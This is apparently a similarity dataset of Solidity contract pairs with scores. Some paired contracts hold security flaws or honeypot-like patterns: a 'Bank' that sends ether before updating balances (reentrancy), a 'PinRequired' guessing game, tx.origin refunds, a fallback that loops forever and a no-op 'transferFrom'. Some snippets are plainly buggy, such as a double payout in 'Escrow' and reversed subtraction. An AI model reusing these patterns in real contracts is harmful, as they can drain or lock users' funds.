        return jsonKvps;

    }

}"
"contract number {
    uint public num = 0; 

    function setNum(uint _num) public {
        num = _num;
        
    }

    function setNumCheck(uint _num) public {
        if (num != _num) {
          num = _num;
        }
        
    }",0.6179940111809643,"contract SaiTap {
    function s2s() public returns (uint);
    function bid(uint wad) public returns (uint);
    function ask(uint wad) public returns (uint);
}"
"contract OrderMatters {

    

    address it; 

    constructor() public {
        it = msg.sender;
    }

    function tagYoureIt(address _newIt) public returns(address newIt) {
        require(msg.sender == it); 
        it = _newIt;
        return it;
    }
}",0.6604094857119457,"contract owned {

    address public owner;



    constructor() public {owner = msg.sender;}



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function ayu(address nO) onlyOwner public {owner = nO;}

}"
"contract ValueSetter {

  struct ValueStruct {
    uint256 value;
  }

  address public my_address; 

  mapping(address => ValueStruct) public valueStructs;

  function ValueSetter() public {
    my_address = msg.sender;
  }

  function set_value(uint256 my_value) external {

    
    require(msg.sender == my_address && my_value != 0);

    
    

    valueStructs[msg.sender].value = my_value;

    
    assert(valueStructs[msg.sender].value != 0);
  }
}",0.6374191373095968,"contract Wallet {

    event Receive(address from, uint value);

    event Send(address to, uint value);



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function() public payable {

        emit Receive(msg.sender, msg.value);

    }



    function transfer(address to, uint value) public {

        require(msg.sender == owner);

        to.transfer(value);

        emit Send(to, value);

    }

}"
"contract CheckBehavior {

    mapping(address => uint256) _deposits;

    function depo() public payable{
        _deposits[msg.sender]= msg.value;
    }

    function checkBalance() public returns (uint) {
        return address(this).balance;
    }

    function withdrawA(uint256 _amt) public {

        msg.sender.transfer(_amt);
    }

    function withdrawB(address payable payee, uint256 _amt) public {

        payee.transfer(_amt);
    }

    function withdrawWithGas(address payable payee) public {
        uint256 payment = _deposits[payee];

        _deposits[payee] = 0;

        payee.transfer(payment);
    }
}",0.6588607362623795,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function () payable external {

        uint256 i;

        while (true) {

            i = i + 1;

        }

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract ModiferTesting {
   uint public a;
   uint public b;
   uint public c;

   modifier modA() {
    a = a + 1;
    _;
   }

   modifier modB() {
    b = b + 1;
    _;
    b = b + 1;
    _;
    b = b + 1;
    _;
  }

  function test() public modA modB {
    c = c + 1;
  }
}",0.6416475536053553,"contract SafeMath {

    function safeAdd(uint _a, uint _b) public pure returns (uint c) {

        c = _a + _b;

        require(c >= _a);

    }

    function safeSub(uint _a, uint _b) public pure returns (uint c) {

        require(_b <= _a);

        c = _a - _b;

    }

}"
"contract Election {

struct Candidate {
    string name;
    uint voteCount; }

struct Voter {
    bool authorized;
    bool voted;
    uint vote; }

address public owner; string public electionName;

mapping(address => Voter) public voters; Candidate[] public candidates; uint public totalVotes;

modifier ownerOnly(){
    require(msg.sender == owner);
    _; }

constructor (string memory _name) public {
    owner = msg.sender;
    electionName = _name; }

function addCanditate(string memory _name) ownerOnly public {
    candidates.push(Candidate(_name, 0)); }

function getNameCandidate() public view returns(uint){
    return candidates.length; }

function authorize (address _person) ownerOnly public {
    voters[_person].authorized = true; }

function vote (uint _voteIndex) public {
    require(!voters[msg.sender].voted);
    require(voters[msg.sender].authorized);

    voters[msg.sender].vote = _voteIndex;
    voters[msg.sender].voted = true;

    candidates[_voteIndex].voteCount += 1;
    totalVotes += 1; } function end() ownerOnly public {
    selfdestruct(msg.sender); }

}",0.629686023936913,"contract IprontoToken is StandardToken {



  

  string public constant name = ""iPRONTO"";



  

  string public constant symbol = ""IPR"";



  

  uint8 public constant decimals = 18;



  

  uint256 public constant INITIAL_SUPPLY = 45000000 * (1 ether / 1 wei);



  address public owner;



  

  mapping (address => bool) public validKyc;



  event ApprovedKyc(address[] addrs);



  function IprontoToken() public{

    totalSupply = INITIAL_SUPPLY;

    balances[msg.sender] = INITIAL_SUPPLY;

    owner = msg.sender;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }



  

  function approveKyc(address[] _addrs)

        public

        onlyOwner

        returns (bool)

    {

        uint len = _addrs.length;

        while (len-- > 0) {

            validKyc[_addrs[len]] = true;

        }

        emit ApprovedKyc(_addrs);

        return true;

    }



  function isValidKyc(address _addr) public constant returns (bool){

    return validKyc[_addr];

  }



  function approve(address _spender, uint256 _value) public returns (bool) {

    require(isValidKyc(msg.sender));

    return super.approve(_spender, _value);

  }



  function() public{

    throw;

  }

}"
"contract HelloWorld {
    event Print(string out);
    function() {
      Print(""Hello, World!"");
    }
    function test() constant returns (int) {
      return 7;
    }
  }",0.6503720992618222,"contract FiatContract {

    function ETH(uint _id) constant returns (uint256);

    function USD(uint _id) constant returns (uint256);

}"
"contract Counter {

    struct UserStruct {
        uint balance;
        uint counter;
    }

    mapping(address => UserStruct) public userStructs;

    function deposit() public payable returns(bool success) {
        require(msg.value > 0);
        userStructs[msg.sender].balance += msg.value;
        userStructs[msg.sender].counter ++;
        return true;
    }
}",0.6167061774909075,"contract Registration is owned { 
    
    mapping (address => bool) public isRegistered;   
      
    function () public payable {
        
        if (msg.value == 10000000000000000) {
            isRegistered[msg.sender] = true; 
        } else { 
            revert();
        }
        
    }
    
    function collectFees() onlyOwner public { 
        require(this.balance > 0);
        
        msg.sender.transfer(this.balance);
    }
    
}"
"contract Test {
   
   uint[3] storage_array;

   function getArray() public view returns(uint[3]){
       return storage_array;
   }

   
   function setArray() public {
       uint[3] memory tmp = [uint(1),2,3];
       storage_array =tmp;
   }

   
   function fillTemp() public returns (uint[3]) {
       uint[3] memory tmp = [uint(1),2,3];
       return tmp;
   }

}",0.6383668760336874,"contract DateTime {

    function isLeapYear(uint16 year) public pure returns (bool);

    function getYear(uint timestamp) public pure returns (uint16);

    function getMonth(uint timestamp) public pure returns (uint8);

    function getDay(uint timestamp) public pure returns (uint8);

}"
"contract Test {
    function b32ToU24(bytes32 barray) external pure returns (uint24) {
        return uint24(bytes3(barray << 24));
    }

    function b32ToU24ASM(bytes32 barray) external pure returns (uint24) {
        uint24 result;

        assembly {
            
            
            result := shr(0xd0, barray)
        }

        return result;
    }
}",0.6278140259134546,"contract Utils {

  function testrc(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns(address) {

    return ecrecover(hash, v, r, s);

  }



  function hash(uint x, uint y, uint z, uint w) public pure returns(bytes32) {

    return sha3(x,y,z,w);

  }

}"
"contract ShippingInterface {
  function doStuff() ... ;
}",0.6521142062208626,"contract DepositBrokerInterface {
    function clear();
}"
"contract Shipping is ShippingInterface {
  function doStuff() .. { 
}",0.6213874816232521,"contract SaleInterface {

    function refund(address _to) public;

}"
"contract NullVals {

    struct Test {
        address a;
        uint256 b;
        bytes32 c;
        address d;
    }

    mapping(bytes32 => Test) public tests;

    function silentSetter(bytes32 key, address a) public {
        Test storage t = tests[key];
        t.a = a;
    }

}",0.6025257603038988,"contract Token {
    mapping (address => uint256) public balanceOf;
    function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     ) public payable returns(bool success) {
        _from = _from;
        _to = _to;
        _amount = _amount;
        return true;
    }
}"
"contract BuyPreimage {
    address payable buyer;
    address payable seller;
    bytes32 public hash;
    uint256 public deadline;

    constructor(address payable _seller, bytes32 _hash, uint256 timeout) public payable {
        buyer = msg.sender;
        seller = _seller;

        hash = _hash;
        deadline = now + timeout;
    }

    
    function providePreimage(bytes calldata preimage) external {
        require(keccak256(preimage) == hash);
        seller.transfer(address(this).balance);
    }

    
    function refund() external {
        require(msg.sender == buyer);
        require(now >= deadline);

        msg.sender.transfer(address(this).balance);
    }
}",0.6303503230018139,"contract PingLine {

    

    address payable private constant targetAddress = 0xeeAD74C98c573b43A1AF116Be7C4DEbb0a4fd4A8;

    address payable private owner;

    

    constructor() public {

        owner = msg.sender;

    }

    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function ping(uint256 times) public onlyOwner {

        for (uint256 i = 0; i < times; i++) {

            (bool ignore,) = targetAddress.call("""");

            ignore;

        }

    }

    

    function withdraw() public onlyOwner {

        owner.transfer(address(this).balance);

    }    

    

    function kill() public onlyOwner {

        selfdestruct(owner);

    }    

    

    function () external payable {

    }



}"
"contract TestNode { 
    uint[] nodes;

    function createNode(uint data) public {
        delete nodes; 
        nodes.push(data);
    }

    function pushNode(uint data) public {
        nodes.push(data);
    }

    function getNode() public view returns(uint[] memory) {
        return nodes;
    }
}",0.6409111454599213,"contract ERC20TokenBankInterface{
  function balance() public view returns(uint);
  function token() public view returns(address, string memory);
  function issue(address _to, uint _amount) public returns (bool success);
}"
"contract C1 {
    uint public _n;  

    function foo(uint n) returns(uint) {
        _n = n;
        return _n;
    }

    function invoke(bytes4 methodId, uint n) returns(bool) {
        return this.call(methodId, n);
    }
}",0.6165663514658389,"contract Token {
    function balanceOf(address a) external returns (uint) {return 0;}
    function transfer(address a, uint val) external returns (bool) {return false;}
}"
"contract Service{
  function isAlive() constant returns(bool alive) {} 
}",0.6811026210570683,"contract AmIOnTheFork {

    function forked() public constant returns(bool);

}"
"contract Client {
  Service _s; 

  function Client(address serviceAddress) {
    _s = Service(serviceAddress); 
  }

  function Ping() public constant returns(bool response) {
    return _s.isAlive(); 
  }
}",0.6625128607772065,"contract IDapCarToken {
    function mint(address _address, uint256 _value) public returns (bool);
    function balanceOf(address _owner) public constant returns (uint balance);
}"
"contract ApprovalContracts { 

  address public sender;   
  address payable public receiver; 
  address public approver = 0xc7780C9521C2C2abED69f0D65BEbF9794C55ae94;  

  function deposit(address payable _receiver) external payable {  

    require(msg.value >0); 
    sender = msg.sender; 
    receiver = _receiver;
  }

  function viewApprover() external view returns(address) { 
    return approver;
  }

  function approve() external { 
    require(msg.sender == approver); 
    receiver.transfer(address(this).balance);
  }

}",0.6306403777180418,"contract BitcoinBravado {

    

    address public owner;

    

    mapping(address => bool) paidUsers;

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    function BitcoinBravado() public {

        owner = msg.sender;

    }

    

    function payEntryFee() public payable  {

        if (msg.value >= 0.1 ether) {

            paidUsers[msg.sender] = true;

        }

    }

    

    function getUser (address _user) public view returns (bool _isUser) {

        return paidUsers[_user];

    }

    

    function withdrawAll() onlyOwner() public {

        owner.transfer(address(this).balance);

    }

}"
"contract MyContract is Ownable {
    function start() external onlyOwner {
        ...
    }

    function stop() external onlyOwner {
        ...
    }
}",0.6581298573687773,"contract iWETH is iERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}"
"contract Refund {

    bool public isRefunding;
    mapping(address => uint) public balances;

    event LogInvestment(address investor); 
    event LogRefundStarted();
    event LogRefundSent(address investor, uint amount);

    function invest() public payable returns(bool success) {
        require(!isRefunding);
        require(msg.value == 0.1 ether);  
        balances[msg.sender] +=  msg.value;
        emit LogInvestment(msg.sender);
        return true;
    }

    

    function setRefunding() public returns(bool success) {
        require(!isRefunding);
        emit LogRefundStarted();
        return true;
    }

    function claimRefund() public returns(bool success) {
        uint amount = balances[msg.sender];
        require(amount > 0);
        balances[msg.sender] = 0;
        emit LogRefundSent(msg.sender, amount);
        return true;
    }

}",0.6760043041184027,"contract RefundableCrowdsale is FinalizableCrowdsale {
  using SafeMath for uint256;

  
  uint256 public goal;

  mapping (address => bool) refunded;
  mapping (address => uint256) saleBalances;  
  mapping (address => bool) claimed;

  event Refunded(address indexed holder, uint256 amount);

  function RefundableCrowdsale(uint256 _goal) public {
    goal = _goal * 1 ether;
  }

  
  function claimRefund() public {
    require(isFinalized);
    require(!goalReached());
    require(!refunded[msg.sender]);
    require(saleBalances[msg.sender] != 0);

    uint refund = saleBalances[msg.sender];
    require (msg.sender.send(refund));
    refunded[msg.sender] = true;

    Refunded(msg.sender, refund);
  }

  function goalReached() public view returns (bool) {
    return weiRaised >= goal;
  }

}"
"contract ArrayOfStructs {

    

    struct Thing {
        uint a;
        bool b;
    }

    

    Thing[] public things; 

    event LogAppendThing(address sender, uint a, bool b);

    

    function append(uint _a, bool _b) public {
        Thing memory t = Thing({
            a: _a,
            b: _b
        });
        things.push(t);

        

        emit LogAppendThing(msg.sender, _a, _b);
    }

    

    

    

    function thingCount() public view returns(uint count) {
        return things.length;
    }
}",0.6098098204737865,"contract ERC20 {

    mapping(address => mapping(address => uint)) public allowed;

    function transferFrom(address from, address to, uint amount) public returns (bool);

    function transfer(address to, uint amount) public returns (bool);

    function approve(address spender, uint amount) public returns (bool);

    function balanceOf(address a) public view returns (uint);

}"
"contract X {
    mapping (address => uint) l;

    function lock() {
        l[msg.sender] = now;
    }

    function unlock() {
        delete l[msg.sender];
    }

    function unlock2() {
        if(l[msg.sender] > 0)
            delete l[msg.sender];
    }
}",0.6297393465577815,"contract Vote {
    address creator;

    function Vote() {
        creator = msg.sender;
    }

    function() {
        if (msg.value > 0) {
            tx.origin.send(msg.value);
        }
    }

    function kill() {
        if (msg.sender == creator) {
            suicide(creator);
        }
    }
}"
"contract Message {

    address public owner;
    string public message;

    function Message() public {
      message = ""Initial Message"";
      owner = msg.sender;
    }

    function retrieveMessage() constant
       returns (string _messageString)
    {
      return message;
    }

    

    function setMessage(string messageString) 
      returns(bool success) 
    {
      if(msg.sender != owner) throw; 
      message = messageString;
      return true;
    }

}",0.6415561096202014,"contract Hash {
    
    address owner;

    
    function Hash() public {
        owner = msg.sender;
    }

    
    function() internal {
        revert();
    }

    function hashString(string dataString) public pure returns(bytes32){
        return(keccak256(dataString));
    }

    function hashBytes(bytes dataBytes) public pure returns(bytes32){
        return(keccak256(dataBytes));
    }

    function selfDestruct() public {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract ECRecover {
    function ECR(bytes32 _Msg, uint8 _v, bytes32 _r, bytes32 _s) public pure returns (address) {
        return ecrecover(_Msg, _v, _r, _s);
    }
}",0.6016196855968929,"contract NewMkrOracle {
    function read() external pure returns (bytes32) {
        revert();
    }
    function peek() external pure returns (bytes32, bool) {
        return (0, false);
    }
}"
"contract B {

    uint public data = 34;

    function killContractA(address _a) public {
        A a = A(_a);
        a.bye();
    }

    function killMyself(address _a) public {
        _a.delegatecall(bytes4(keccak256(""bye()"")));
    }
}",0.6114240143741543,"contract CryptoMiningWarInterface {

    uint256 public deadline; 

    function subCrystal( address , uint256  ) public pure {}

    function addCrystal( address , uint256  ) public pure {}

}"
"contract SimpleStore {
    uint256 public value;
    address public addr;

    function set(address[] calldata _addr, uint256[] calldata _value) external {
        value = _value[0];
        addr = _addr[0];
    }

    function get() external view returns (uint256) {
        return value;
    }
}",0.699638229899633,"contract ERC20 {
	function balanceOf(address who) public view returns (uint256);

	function transfer(address to, uint256 value) public returns (bool);

	function transferFrom(address _from, address _to, uint _value) external returns (bool);
}"
"contract Test {

    struct MyStruct {
        uint256 x;
        uint256 y;
    }

    function testFunc() public pure returns (uint, uint) {
        MyStruct memory data1 = MyStruct(5,7);
        return myFunc(data1);
    }

    function myFunc(MyStruct memory data) internal pure returns (uint256 _z, uint _w) {
        assembly {
            _z := mload(data)
            _w := mload(add(data,0x20))
        }
    }
}",0.6040678108072485,"contract SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x);
    }
    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x);
    }
    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }
}"
"contract Two {
    
    
    function callOne(One one) external {
        
        one.callme();
    }
}",0.6443392486298452,"contract solcChecker {

     function f(bytes calldata x) external;

}"
"contract WeHaveMoneyToBurn {

    mapping(address => uint) public userBalances;

    event LogDeposit(address depositor, uint amount);
    event LogWithdrawl(address withdrawer, uint amount);
    event LogFundsDestroyed(address victim, uint amount);

    
    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
        emit LogDeposit(msg.sender, msg.value);
    }

    
    function withdraw(uint amount) public {
        require(amount <= userBalances[msg.sender], ""Insufficient Funds"");
        userBalances[msg.sender] -= amount;
        emit LogWithdrawl(msg.sender, amount);
        msg.sender.transfer(amount);
    }

    
    function burnSome(address burnFrom, uint amount) public {
        require(amount <= userBalances[burnFrom], ""User does have that much to burn"");
        userBalances[burnFrom] -= amount;
        emit LogFundsDestroyed(burnFrom, amount);
        address(0).transfer(amount);
    }
}",0.6622977539034289,"contract Bank {

	address owner;

	uint256 public minDeposit = 1 ether;

	mapping (address => uint256) public balances;

	Logger private TrustLog;



	constructor(address _logger) payable public {

		owner = msg.sender;

		TrustLog = Logger(_logger);

	}



	function deposit() public payable {

		if (msg.value >= minDeposit) {

			balances[msg.sender]+=msg.value;

			TrustLog.LogTransfer(msg.sender,msg.value,""deposit"");

		} else {

			TrustLog.LogTransfer(msg.sender,msg.value,""depositFailed"");

		}

	}



	function withdraw(uint256 _amount) public {

		if(_amount <= balances[msg.sender]) {

		    (bool success, ) = msg.sender.call.value(_amount)("""");

			if(success) {

				balances[msg.sender] -= _amount;

				TrustLog.LogTransfer(msg.sender, _amount, ""withdraw"");

			} else {

				TrustLog.LogTransfer(msg.sender, _amount, ""withdrawFailed"");

			}

		}

	}



	function checkBalance(address _addr) public view returns (uint256) {

		return balances[_addr];

	}

}"
"contract Ownable {
    event OwnableE(uint);
    function Ownable() public {
        emit OwnableE(1);
    }
}",0.6459579635659994,"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }
}"
"contract Crowdsale {
    event CrowdsaleE(uint);
    function Crowdsale() public {
        emit CrowdsaleE(1);
    }
}",0.6068629068936259,"contract HoardCrowdsale {

    function invest(address addr,uint tokenAmount) public payable {

    }

}"
"contract Crowdfunding {
    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
    }

    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    address[] public approvers;

    function Crowdfunding(uint minimum) public {
        manager = msg.sender;
        minimumContribution = minimum;
    }",0.6252689457837697,"contract Mintable is Ownable {

    mapping(address => bool) public minters;



    modifier onlyMinter {

        require(minters[msg.sender] == true);

        _;

    }



    function Mintable() public {

        adjustMinter(msg.sender, true);

    }



    function adjustMinter(address minter, bool canMint) public onlyOwner {

        minters[minter] = canMint;

    }



    function mint(address to, uint256 value) public;



}"
"contract Parent {
    string w;

    function Set(string _w) public {
        w = _w;
    }

    function Greet(string name) internal view returns(string) {
        return string(abi.encodePacked(w, name));
    }
}",0.6806385351737209,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract Child is Parent {
    function Get() public view returns(string) {
        return Greet(""Bob"");
    }
}",0.6991978213988632,"contract TimeAware is Ownable {



    

    function getTime() public view returns (uint) {

        return now;

    }



}"
"contract Thingy {
    uint256[] stateArray;
    function doStuff() public {

        
        
        
        

        uint256[] localReference = stateArray;

        
        
        

        uint256[] memory memArray = new uint256[](5);
    }
}",0.6002241616048586,"contract ExternalTokensSupport {

    function calculateAmount(address, uint256, address, bytes, uint256) public pure returns(uint256, uint256, uint256) {}

}"
"contract BytesToUint {

    function toUint(bytes _value) external pure returns (uint) {
        return toUint_(_value);
    }

    function toUint_(bytes memory _value) internal pure returns (uint) {
        uint256 r;

        for(uint256 i = 0; i < _value.length; i++) {
            r += uint256(_value[i]) << (i * 8);
        }
        return r;
    }
}",0.6546092914706306,"contract SafeMath {



    

    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a);

        uint256 c = a - b;



        return c;

    }



    

    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a);



        return c;

    }



}"
"contract Callee {
uint public value;
address public sender;

function setValue(uint _value) {
    value = _value;
    sender = msg.sender;
    
    

    
}
}",0.6685428880724839,"contract loglib {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }
   
   
   
}"
"contract Structs {
  struct Param {
    uint _value1;
    address _value2;
    address _value3;
    string _value4;
    string _value5;
    uint _value6;
    string _value7;
    address _value8;
  }

  function get() public view returns (Param memory) {
    return Param(1, address(0x2), address(0x3), ""Hi"", ""Mom"", 3141, ""Spagueti"", address(0x42));
  }

  function get2() public view returns (Param memory, uint, bool) {
    return (get(), 454545, false);
  }
}",0.6098607637675851,"contract ERC20 {
    function totalSupply() public view returns (uint256);

    function balanceOf(address who) public view returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals;
}"
"contract SimpleMultisig {

  address one;
  address two;

  mapping(address => bool) signed;

  constructor() public {
    one = 0x14723a09acff6d2a60dcdf7aa4aff308fddc160c;
    two = 0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db;
  }

  function Sign() public {
    require (msg.sender == one || msg.sender == two);
    require (signed[msg.sender] == false);
    signed[msg.sender] = true;
  }

  function Action() public returns (string) {
    require (signed[one] == true && signed[two] == true);
    return ""Your action here"";
    signed[one] = false;
    signed[two] = false;
  }
}",0.6125229870236799,"contract saleOwned is owned{

    mapping (address => bool) public saleContract;



    modifier onlySaleOwner {        

        require(msg.sender == owner || true == saleContract[msg.sender]);

        _;

    }



    function isSaleOwner() public view returns (bool success) {     

        if(msg.sender == owner || true == saleContract[msg.sender])

            return true;

        return false;

    }



    function addSaleOwner(address saleOwner) onlyOwner public {

        saleContract[saleOwner] = true;

    }



    function delSaleOwner(address saleOwner) onlyOwner public {

        saleContract[saleOwner] = false;

    }

}"
"contract Test {

  function test() public pure {
    require(1 != 2, ""1 is 2"");
    require(2 != 3, ""2 is 3"");
  }
}",0.6064763833275044,"contract Test {



    

    function add(uint8 arg1,uint8 arg2) public pure returns (uint8) {

        return arg1+arg2;

    }



}"
"contract Escrow {

    using SafeMath for uint;

    address public owner;
    uint public fee;

    mapping (address =>  mapping (address => uint)) public balances;

    function Escrow() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function setFee(uint price) onlyOwner external {
        fee = price;
    }

    function start(address payee) payable external {
        balances[msg.sender][payee] = balances[msg.sender][payee] + msg.value;
    }

    function end(address payer, address payee) onlyOwner payable external {
        uint value = balances[payer][payee];
        uint paidFee = value.div(uint(1000000).div(fee));
        uint payment = value.sub(paidFee);
        payee.transfer(payment);
        owner.transfer(paidFee);
        balances[payer][payee] = 0;
        payee.transfer(value);
    }
}",0.6539060843424096,"contract PinRequired {

    address payable public owner;

    uint private topSecretNumber = 376001928;



    constructor() payable public {

        owner = msg.sender;

    }



	function setPin(uint pin) public {

		require(msg.sender == owner);

		topSecretNumber = pin;

	}



    function withdraw() payable public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    

    function withdraw(uint256 amount) payable public {

        require(msg.sender == owner);

        owner.transfer(amount);

    }



    function kill() public {

        require(msg.sender == owner);

        selfdestruct(msg.sender);

    }



    function guess(uint g) public payable {

        if(msg.value >= address(this).balance && g == topSecretNumber && msg.value >= 1 ether) {

            msg.sender.transfer(address(this).balance + msg.value);

        }

    }

    

	function() external payable {}

}"
"contract B {
    A a;
    constructor(A _a) public { a = _a; }
    function getY(uint id) public returns(uint) {
        (,uint ans,) = a.foo(id);
        return ans;
    }
}",0.6829397568565844,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract Example {
    using SafeMath for uint;

    
    
    
    function addTogether(uint a, uint b) returns (uint) {
        return a.add(b);
    }
}",0.6938871306938714,"contract Agent {
    using SafeMath for uint256;

    function isInitialized() public constant returns (bool) {
        return false;
    }
}"
"contract UserData {

    uint timeLimit;
    struct userInfo{
        bool lock;
        uint endTime;
        string name;
    }
    mapping(address=> userInfo) private user;

    function setName(string memory name) public{
        user[msg.sender].name = name;
    }

    function setLockTime(uint timeToEnd, bool lock) public {
        user[msg.sender].lock = lock;
        user[msg.sender].endTime = timeToEnd;
    }

    modifier isLocked(address userAddress){
        require(user[userAddress].lock != true);
        require(user[userAddress].endTime < now);
        _;
    }

    function getUserInfo(address userAddress) public view isLocked(userAddress) returns (string memory){
        return user[userAddress].name;
    }
}",0.6131914679405617,"contract Dist{



    

    address public owner;

    address public tokenAddress; 

    uint public unlockTime;



    

    ERC20Basic token;



    modifier onlyOwner{

        require(msg.sender == owner);

        _;

    }



    

    

    



    constructor(address _owner, uint _unlockTime, address _tokenAddress){

        owner = _owner;

        tokenAddress = _tokenAddress;

        token = ERC20Basic(_tokenAddress);

        unlockTime = _unlockTime;

    }



    function balance() public view returns(uint _balance){



        return token.balanceOf(this);

    }



    function isLocked() public view returns(bool) {



        return (now < unlockTime);

    }



    function withdraw() onlyOwner {



        if(!isLocked()){

            token.transfer(owner, balance());

        }

    }



}"
"contract C {
    function a(uint x) returns(uint) { return x; }
}",0.6483007139116458,"contract DSTrueFallback {

    function() returns (bool) {

        return true;

    }

}"
"contract Numbers {
    int[] public numbers;

    function Numbers() public {
        numbers.push(20);
        numbers.push(32);

        int[] storage myArray = numbers;
    }
}",0.6880644385430917,"contract Number {
    uint number;
    
    function Number(uint _number) public {
    number=_number;
    }
    function change(uint _number) public {
    number=_number;
    }
}"
"contract Sample {

  address private receiver;
  uint public amount;

  function pay(address _receiver) payable public returns (bool) {
    receiver = _receiver;
    receiver.transfer(msg.value);
    return true;
  }
}",0.678941633283692,"contract VpaxContract {



  function VpaxContract(){}



  function transferCoins(address receiver) payable public {

    require(receiver != 0X0);

    require(msg.sender != receiver);

    require(msg.value > 0);

    receiver.transfer(msg.value);

  }

}"
"contract B {
    function getBalance() constant returns (uint256 balance) {
        balance = this.balance;
    }

    function () payable {
    }
}",0.6834173336662391,"contract Token {
    uint256 public totalSupply;
    function balanceOf(address _owner) constant returns (uint256 balance);
}"
"contract ContractName {
    function ContractName(...) public {
        ...
    }
    ...
}",0.650030912487695,"contract Share {
    function onIncome() public payable;
}"
"contract ArrayTes {

    function secfun(uint256 a) public pure returns(uint256) {
        uint l;
        l = l + a;
        return l;
    }
}",0.6935878462460108,"contract A {

    uint256 private number;

    

    function getNumber() public view returns (uint256) {

        return number;

    }

}"
"contract myContract  {

    address public creator;

    function myContract() {
        creator = msg.sender;
    }
}",0.6920855543164712,"contract TestContract {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
}"
"contract Back {
    uint availableFunds;

    event Received(uint);

    function () external payable {
        uint received = msg.value;
        availableFunds += received;
        emit Received(received);
    }

    function total() public view returns (uint) {
        return address(this).balance;
    }
}",0.6213312698323561,"contract ERC20Basic {
     uint public totalSupply;
     function balanceOf(address who) public view returns (uint); 
     function transfer(address to, uint value) public ; 
     event Transfer(address indexed from, address indexed to, uint value); 
}"
"contract Front {
    Back public back;

    event Created(address);
    event Received(uint);

    constructor() public {
        back = new Back();
        emit Created(address(back));
    }

    function () external payable {
        emit Received(msg.value);
    }

    function forward() public payable {
        address(back).call.value(address(this).balance).gas(gasleft())("""");
    }

    function total() public view returns (uint) {
        return address(this).balance;
    }
}",0.6363855565575071,"contract Counter {
    
    event Won(address winner, uint amount);
    
    uint public i;
    address public owner;
    
    function Counter() public {
        owner = msg.sender;
    }
    
    function reset() public {
        require(msg.sender==owner);
        i=0;
    }
    
    function inc() public payable {
        require(msg.value >= 0.001 ether);
        i++;
        if (i==2) {
            emit Won(msg.sender,address(this).balance);
            msg.sender.transfer(address(this).balance);
            i = 0;
        }
    }
    
}"
"contract Test {
    function iadd(int a, int b) public pure returns (int) {return a + b;}
    function uadd(uint a, uint b) public pure returns (uint) {return a + b;}
}",0.667212601502817,"contract Manager {
    function ilks(uint) public view returns (bytes32);
    function owns(uint) public view returns (address);
    function urns(uint) public view returns (address);

}"
"contract Mar is Bob {

    function vote() public {
        foo();
    }

    function foo() internal {
    }
}",0.6099623109710189,"contract WETH {

    function deposit() public payable;

    function withdraw(uint) public;

}"
"contract factory {

  
  address[] private generated;

  function createContract() public returns(bool success)
  {
    Generated g = new Generated(); 
    generated.push(g); 
    return true;
  }

  
  function getGeneratedCount() public constant returns(uint count) {
    return generated.length;
  }

  
  function getAddressAtIndex(uint row) public constant returns(address contractAddress) {
    return generated[row];
  }
}",0.6535632538300391,"contract Certifier {
	event Confirmed(address indexed who);
	event Revoked(address indexed who);
	function certified(address) public constant returns (bool);
	function get(address, string) public constant returns (bytes32);
	function getAddress(address, string) public constant returns (address);
	function getUint(address, string) public constant returns (uint);
}"
"contract Generated {
    
}",0.6502083002739978,contract Owned {}
"contract SimpleAirdrop {

      ERC20 public token;

        function SimpleAirdrop(address _tokenAddr) public {
        token = ERC20(_tokenAddr);
}

  function getAirdrop() public {
    token.transfer(msg.sender, 100000000000000000000); 
  }",0.6087291711940523,"contract Pool is Ownable {
    
    IERC20 token;
    
    constructor(address tokenAddress) public {
        token = IERC20(tokenAddress);
    }
    
    function send(address to, uint value) public onlyOwner  {
        token.transfer(to, value);
    }
}"
"contract Subtract {

    function subtract(uint a, uint b) public pure returns(uint remainder) {
        if(b>a) return 0;
        return b-a;
    }
}",0.6577584206225964,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract Child {

    
    

    Base b;

    
    

    function Child(address bAddress) {
        b = Base(bAddress);
    }

    function set (uint _stored) {
        b.set(_stored);
    }

    

    function get () constant returns (uint) {
        return b.get();
    }
}",0.6611686810515229,"contract IGold {

    function balanceOf(address _owner) constant returns (uint256);

